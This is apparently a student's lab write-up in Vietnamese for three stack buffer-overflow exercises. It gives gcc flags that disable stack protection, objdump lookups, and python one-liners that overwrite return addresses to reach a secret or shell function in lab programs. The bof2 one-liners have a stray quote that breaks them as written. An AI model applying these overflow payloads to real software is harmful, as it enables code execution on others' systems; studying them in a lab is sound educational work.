# 22110054 Nguyễn Hữu Nghi
***
# Buffer-overflow Attack

## Bof1
Stack-frame

![image](https://github.com/user-attachments/assets/47c6fffc-c76a-49fe-a1f3-91fc6b3f2c34)
<br></br>
<br>
Biên dịch bằng chương trình: 
`gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2 `

Sử dụng lệnh `objdump -d bof1.out | grep secretFunc` để xác định vị trí hàm secretFunc và các đoạn mã liên quan tới hàm này

Sau đó, sử dụng lệnh `echo $(python -c "print('a'*204 + '\x08\x04\x84\x6b')") | ./bof1.out` để chèn 204 bytes kí tự bất kì ( ở đây là ký tự 'a') để thực hiện tấn công.
</br>
<br>Kết quả sẽ là: Congratulation!</br>
![alt](https://github.com/nghi113212/Security-lab-submit/blob/main/imgs/Screenshot%202024-09-09%20093458.png)

## Bof2
Stack-frame


![image](https://github.com/user-attachments/assets/481d51a2-7068-4d38-9874-5f43c3fc4def)
<br>
Biên dịch chương trình bằng gcc: <br>
`gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2 `
</br>
Chạy thử chương trình bằng lệnh `echo $(python -c "print('a'*41')") | ./bof2.out` để dò được địa chỉ `0xdeadbeef`
  <br>Kết quả sẽ là: You are on the right way!</br>
Sau đó chạy tiếp chương trình bằng lệnh `echo $(python -c "print('a'*40')") | ./bof2.out`
  <br>Kết quả hiển thị sẽ là: Yeah! You Win!</br>
</br>

![alt](https://github.com/nghi113212/Security-lab-submit/blob/main/imgs/Screenshot%202024-09-09%20093233.png)


## Bof3
Stack-frame

![image](https://github.com/user-attachments/assets/5ba00958-3f82-4eb7-9993-bef36dfc1a66)

<br>Biên dịch chương trình dùng lệnh:`gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2 ` </br>
<br>Sử dụng lệnh: `objdump -d bof3.out | grep shell` để xác định hàm shell</br>
<br>Sau đó thực hiện lệnh:`echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out` để chèn 128 byte kí tự 'a' vào chương trình</br>
<br>Kết quả sẽ là: You make it! The shell() function is executed</br>
<br></br>
![alt](https://github.com/nghi113212/Security-lab-submit/blob/main/imgs/Screenshot%202024-09-09%20092857.png)




